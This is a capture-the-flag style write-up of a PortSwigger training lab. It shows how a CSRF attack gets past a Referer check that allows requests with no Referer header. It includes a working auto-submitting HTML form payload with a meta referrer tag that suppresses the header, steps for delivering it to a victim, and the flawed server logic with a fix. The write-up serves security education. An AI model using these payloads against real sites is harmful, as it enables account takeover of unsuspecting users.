# PortSwigger Lab: CSRF where Referer validation depends on header being present

**Platform:** PortSwigger Web Security Academy  
**Difficulty:** Medium  
**Type:** CSRF with Referer Validation  
**Objective:** Change victim's email using CSRF attack  
**Key Vulnerability:** Referer header validation has insecure fallback

---

## Attack Flow

```
Login & analyze email change request
→ Discover no CSRF token
→ Discover Referer header validation
→ Normal CSRF fails (Referer blocked)
→ Manually remove Referer → Request accepted
→ Use <meta name="referrer" content="never">
→ Browser doesn't send Referer header
→ Deploy on exploit server
→ Victim's email changed
```

---

## 1. Request Headers Analysis

![Change-email request with Referer header](image/image-1-request-headers.png)

Normal email change request:

```http
POST /my-account/change-email HTTP/2
Host: target.web-security-academy.net
Cookie: session=...
Content-Type: application/x-www-form-urlencoded
Referer: https://target.web-security-academy.net/my-account?id=wiener
Origin: https://target.web-security-academy.net

email=user@user.es
```

**Key observations:**
- ❌ No CSRF token
- ✅ Session cookie present
- ✅ Referer header present (same-origin)
- ✅ Origin header (same-origin)

---

## 2. Normal CSRF Payload (Fails)

```html
<iframe name="csrf-frame" style="display:none;"></iframe>
<form method="POST" 
      action="https://target.web-security-academy.net/my-account/change-email" 
      target="csrf-frame">
  <input type="hidden" name="email" value='hacked@hacked.com'>
</form>
<script>
  document.forms[0].submit();
</script>
```

**Problem:**
- Deployed on exploit server
- Referer header: `https://exploit-server.net/`
- ❌ Blocked by server (Referer from different domain)

---

## 3. Discovery: Remove Referer

Manually test in Burp Repeater:
- Remove the `Referer:` header completely
- Send request
- ✅ Request accepted, email changes

**Finding:**
- Server only checks if Referer header is **present**
- If Referer is **missing** → Request allowed
- Insecure fallback logic

---

## 4. Exploit: Meta Referrer Policy

Use HTML meta tag to prevent Referer header:

```html
<meta name="referrer" content="never">
```

This tells browser: **Don't send Referer header**

---

## 5. Final Working Payload

```html
<iframe name="csrf-frame" style="display:none;"></iframe>
<meta name="referrer" content="never">
<form method="POST" 
      action="https://target.web-security-academy.net/my-account/change-email" 
      target="csrf-frame">
  <input type="hidden" name="email" value='hacked@hacked.com'>
</form>
<script>
  document.forms[0].submit();
</script>
```

**Resulting request:**

```http
POST /my-account/change-email HTTP/2
Host: target.web-security-academy.net
Cookie: session=...
Origin: null
Sec-Fetch-Site: cross-site

email=hacked@hacked.com
```

**Key differences:**
- ❌ No Referer header (meta tag removed it)
- ✅ Session cookie still sent
- ✅ Server's fallback logic: "No Referer? Allow it!"

---

## 6. Deploy & Execute

1. Copy payload to exploit server
2. Click "Store"
3. Click "Deliver exploit to victim"
4. Victim's email changes

Result:
```
Congratulations, you solved the lab!
```

---

## Why It Works

- **No CSRF token** - Relies only on Referer
- **Insecure fallback** - "No Referer = allow" is flawed
- **Meta referrer policy** - Browser respects `content="never"`
- **Session cookie included** - SameSite allows cross-site
- **Same endpoint** - No special origin requirements

---

## Vulnerable Logic

```javascript
if (referer_header_present) {
  if (referer_is_same_origin) {
    allow();
  } else {
    reject();
  }
} else {
  allow();  // ❌ INSECURE
}
```

Should be:

```javascript
if (!referer_header_present || !referer_is_same_origin) {
  reject();  // Always require valid Referer
}
```

---

## Meta Referrer Policies

```html
<!-- No referrer sent -->
<meta name="referrer" content="never">

<!-- Referrer on same-origin only -->
<meta name="referrer" content="same-origin">

<!-- Referrer on same-origin or more secure -->
<meta name="referrer" content="strict-origin">

<!-- Default behavior -->
<meta name="referrer" content="no-referrer-when-downgrade">
```

---

## References

- [PortSwigger — CSRF Prevention](https://portswigger.net/web-security/csrf)
- [MDN — Referrer Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy)
- [MDN — Meta Referrer Tag](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/meta/name#referrer)
- [OWASP — CSRF Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
